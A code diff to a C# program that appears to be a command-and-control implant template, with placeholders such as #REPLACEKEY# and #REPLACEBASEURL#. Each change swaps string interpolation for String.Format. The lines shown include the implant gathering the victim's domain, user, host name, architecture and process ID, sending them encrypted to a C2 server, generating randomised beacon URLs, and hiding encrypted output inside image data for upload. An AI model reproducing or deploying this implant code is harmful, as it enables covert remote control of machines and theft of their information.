@@ -77,7 +77,7 @@ public class Program
 		x.Headers.Add("Referrer", "#REPLACEREFERER#");
 
 		if (null != cookie)
-			x.Headers.Add(System.Net.HttpRequestHeader.Cookie, $"SessionID={cookie}");
+			x.Headers.Add(System.Net.HttpRequestHeader.Cookie, String.Format("SessionID={0}", cookie));
 
 		return x;
 	}
@@ -188,7 +188,7 @@ public class Program
 			var arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
 			int pid = Process.GetCurrentProcess().Id;
 			Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
-			var o = $"{dn};{u};{cn};{arch};{pid};#REPLACEBASEURL#";
+			var o = String.Format("{0};{1};{2};{3};{4};#REPLACEBASEURL#", dn, u, cn, arch, pid);
 			String key = "#REPLACEKEY#", baseURL = "#REPLACEBASEURL#", s = "#REPLACESTARTURL#";
 
 			var primer = GetWebRequest(Encryption(key, o)).DownloadString(s);
@@ -331,7 +331,7 @@ public class Program
 		internal static String GenerateUrl()
 		{
 			string URL = _stringnewURLS[_rnd.Next(_stringnewURLS.Count)];
-			return $"{_baseUrl}/{URL}{Guid.NewGuid()}/?{_randomURI}";
+			return String.Format("{0}/{1}{2}/?{3}", _baseUrl, URL, Guid.NewGuid(), _randomURI);
 		}
 	}
 	
@@ -502,7 +502,7 @@ public class Program
 								beacontime = Parse_Beacon_Time(mch.Groups["t"].Value, mch.Groups["u"].Value);
 							}
 							else
-								output.AppendLine($@"[X] Invalid time ""{c}""");
+								output.AppendLine(String.Format(@"[X] Invalid time ""{0}""", c));
 						}
 	
 						output.AppendLine(strOutput.ToString());
@@ -519,7 +519,7 @@ public class Program
 			catch (Exception e)
 			{
 				var task = Encryption(Key, "Error");
-				var eroutput = Encryption(Key, $"Error: {output.ToString()} {e}", true);
+				var eroutput = Encryption(Key, String.Format("Error: {0} {1}", output.ToString(), e), true);
 				var outputBytes = System.Convert.FromBase64String(eroutput);
 				var sendBytes = ImgGen.GetImgData(outputBytes);
 				GetWebRequest(task).UploadData(UrlGen.GenerateUrl(), sendBytes);
